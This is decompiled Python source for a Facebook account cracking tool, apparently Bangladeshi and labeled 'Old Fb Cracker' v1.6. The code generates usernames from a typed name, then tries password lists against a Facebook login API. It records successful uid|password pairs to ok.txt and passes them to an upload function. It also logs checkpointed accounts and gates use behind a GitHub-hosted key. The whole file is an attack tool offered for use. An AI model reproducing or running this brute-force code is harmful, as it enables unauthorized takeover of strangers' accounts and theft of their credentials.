# Decompile by : Tera abba 
# Time Succes decompile : 2023-08-03 00:21:42.178972 
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +880")
	subprocess.check_output(["am", "start", "https://wa.me/+8801608382209"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/talha123444e441/Talha2/blob/main/Talha2.txt').text
			if basesplit in plr:
				key = basesplit
		...
		print ("""\033[0;92m. .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
\033[0;91m| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
\033[0;92m| |  _________   | || |      __      | || |   _____      | || |  ____  ____  | || |      __      | |
\033[0;93m| | |  _   _  |  | || |     /  \     | || |  |_   _|     | || | |_   ||   _| | || |     /  \     | |
\033[0;94m| | |_/ | | \_|  | || |    / /\ \    | || |    | |       | || |   | |__| |   | || |    / /\ \    | |
\033[0;96m| |     | |      | || |   / ____ \   | || |    | |   _   | || |   |  __  |   | || |   / ____ \   | |
\033[0;95m| |    _| |_     | || | _/ /    \ \_ | || |   _| |__/ |  | || |  _| |  | |_  | || | _/ /    \ \_ | |
\033[0;97m| |   |_____|    | || ||____|  |____|| || |  |________|  | || | |____||____| | || ||____|  |____|| |
\033[0;92m| |              | || |              | || |              | || |              | || |              | |
\033[0;94m| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
\033[0;92m8 '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 


 > \033[0;92mDEVELOPER     : Abu Talha 
 > \033[0;95mFACEBOOK ID   : Abu Talha 
 > \033[0;41mWHATSAPP      : 01608382209
 \033[0;96m> YOUTUBE       :  Team CSB 
 > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK     
    """)
		print("%s [%s�%s] %sTOOL NAME : %sOld Fb Cracker"%(G,R,G,B,G))
		print("%s [%s�%s] %sVERSION   : %s1.6"%(G,R,G,B,G))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: jonny sings): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [Hi] : %s/%s -> \033[0;92m [ Hlw -OK:%s ]- \033[0;93m[Hi -CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[Alhamdulilah-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [Alhamdulilah-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[Mr-CP] %s|%s\033[0;97m         "%(uid, pw))
